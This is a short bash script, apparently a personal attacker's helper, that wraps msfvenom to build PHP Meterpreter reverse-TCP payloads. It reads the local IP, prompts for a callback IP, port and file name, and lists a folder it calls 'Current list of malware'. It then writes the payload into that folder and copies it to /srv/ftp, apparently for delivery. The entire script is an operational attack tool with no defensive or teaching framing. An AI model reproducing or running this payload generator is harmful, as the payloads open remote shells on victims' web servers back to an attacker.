#MSFVenom  php 
#$varTemplate provide a MS Exe eg Calc.exe 
#Use meter.sh to create the reverse meterpreter shell 

l=(ls)

i=ifconfig

g=$($i | grep "inet " | grep -v "127" | sed 's/inet//g' | sed 's/  netmask 255.255.255.0  broadcast *.*.*.*//g')
echo "This is the current IP...." $g
echo "Enter the IP"
read varIP
echo " "
echo "Enter the Local Port eg 443"
read varLPort

echo " "
echo "Current list of malware"
$l ./Output
echo " "

echo "Name of Output file inc exetension"
read varOutFile

msfvenom -p php/meterpreter/reverse_tcp LHOST=$varIP LPORT=$varLPort -f raw  > Output/$varOutFile 

cp Output/$varOutFile /srv/ftp




